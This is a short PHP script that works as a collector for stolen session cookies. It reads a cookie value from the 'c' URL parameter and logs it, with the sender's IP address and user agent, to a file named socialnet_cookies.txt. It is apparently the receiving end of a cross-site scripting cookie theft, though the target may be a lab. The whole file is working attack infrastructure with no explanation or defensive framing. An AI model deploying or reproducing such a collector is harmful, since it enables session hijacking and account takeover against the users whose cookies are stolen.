<?php
$cookie = $_GET["c"] ?? "";
$ip = $_SERVER["REMOTE_ADDR"] ?? "unknown";
$userAgent = $_SERVER["HTTP_USER_AGENT"] ?? "unknown";

$line = date("Y-m-d H:i:s") .
        " | IP: " . $ip .
        " | Cookie: " . $cookie .
        " | User-Agent: " . $userAgent .
        PHP_EOL;

file_put_contents("/tmp/socialnet_cookies.txt", $line, FILE_APPEND | LOCK_EX);

echo "OK";
?>
